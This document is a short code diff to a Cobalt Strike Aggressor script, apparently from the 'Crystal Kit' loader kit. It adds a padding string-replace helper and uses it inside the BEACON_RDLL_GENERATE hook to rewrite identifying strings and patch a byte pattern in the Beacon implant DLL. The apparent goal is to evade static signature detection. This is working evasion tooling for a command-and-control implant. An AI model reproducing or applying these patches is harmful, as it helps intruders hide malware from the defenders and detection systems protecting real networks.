@@ -3,6 +3,45 @@ debug ( 7 );
 import crystalpalace.spec.* from: crystalpalace.jar;
 import java.util.HashMap;
 
+# ------------------------------------------------------------------
+# A wrapper around strrep to pad the new string before replacing it.
+# $1 = input dll
+# $2 = original string
+# $3 = new string
+# return = the modified byte sequence
+# ------------------------------------------------------------------
+sub strrep_pad
+{
+    local ( '$input_dll $original_byte_sequence $new_byte_sequence $original_byte_sequence_length $new_byte_sequence_length $difference $padding $new_byte_sequence_padded' );
+    
+    $input_dll              = $1;
+    $original_byte_sequence = $2;
+    $new_byte_sequence      = $3;
+
+    $original_byte_sequence_length = strlen ( $original_byte_sequence );
+    $new_byte_sequence_length      = strlen ( $new_byte_sequence );
+
+    if ( $new_byte_sequence_length > $original_byte_sequence_length )
+    {
+        warn ("Input string is too large");
+        return $null;
+    } 
+
+    $difference = $original_byte_sequence_length - $new_byte_sequence_length;
+
+    if ( $difference != 0 )
+    {
+        $padding = "\x00" x $difference;
+        $new_byte_sequence_padded = $new_byte_sequence . $padding;
+    }
+    else
+    {
+        $new_byte_sequence_padded = $new_byte_sequence;
+    }
+    
+    return strrep ( $input_dll, $original_byte_sequence, $new_byte_sequence_padded );
+}
+
 sub print_info {
    println ( formatDate ( "[HH:mm:ss] " ) . "\cE[Crystal Kit]\o " . $1 );
 }
@@ -19,6 +58,12 @@ set BEACON_RDLL_GENERATE
         warn ( "Crystal Kit is x64 only" );
         return $null;
     }
+
+    # replace some common strings
+    $beacon = strrep_pad ( $beacon, "beacon.x64.dll", "bacon.x64.dll" );
+    $beacon = strrep_pad ( $beacon, "%02d/%02d/%02d", "%02d/%02d/%04d" );
+    $beacon = strrep_pad ( $beacon, "%s as %s\%s: %d", "%s - %s\%s (%d)" );
+    $beacon = strrep_pad ( $beacon, "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x00\x80\x00\x00", "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x01\x80\x00\x00" );
 
     print_info ( "BEACON_RDLL_GENERATE" );
 
